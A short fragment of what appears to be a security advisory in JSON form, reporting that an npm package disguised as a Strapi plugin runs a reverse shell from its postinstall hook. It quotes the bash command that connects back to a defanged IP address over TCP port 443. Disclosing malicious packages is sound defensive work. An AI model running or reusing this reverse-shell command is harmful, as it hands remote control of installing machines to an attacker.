  "summary": "Malicious code in strapi-plugin-revs-meeb322k (npm)",
  "details": "The package's postinstall hook runs a reverse shell. It executes `bash -c 'bash -i \u003e /dev/tcp/14[.]225[.]210[.]85/443 2\u003e\u00261'` via child_process, opening an interactive shell back to 14[.]225[.]210[.]85 on TCP port 443, and writes a marker file to /tmp. The package is disguised as a Strapi plugin.",
